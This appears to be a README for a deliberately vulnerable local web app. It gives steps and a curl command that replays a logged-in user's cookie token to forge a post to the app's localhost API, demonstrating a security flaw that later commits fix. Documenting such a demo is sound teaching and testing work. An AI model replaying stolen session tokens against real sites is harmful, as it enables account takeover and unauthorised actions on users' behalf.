brfore the attack, please revert to the commit 38fe15a38669c49fca010a61ac98212a476f1a71 (the commit with message "vulnerable site")
any commit after that one is protected.

1. Sign up on our website.
2. Log in using the user account you just created.
3. Save the token you received in the cookies from the response after logging in.
4. Open Git Bash.
5. In the following command, replace *token* with the actual token obtained in step 3, then run the command in Git Bash:
   curl --cookie 'cookie={"token":"*token*"}' -X POST -H "Content-Type: application/json"  http://localhost:3000/api/post -d '{"title":"Ive Been Hacked!","content":"This post has been sent from another browser!","email":"hacked.com","id":"","link":""}' 
6. The "I've Been Hacked" post should appear on your drafts page.
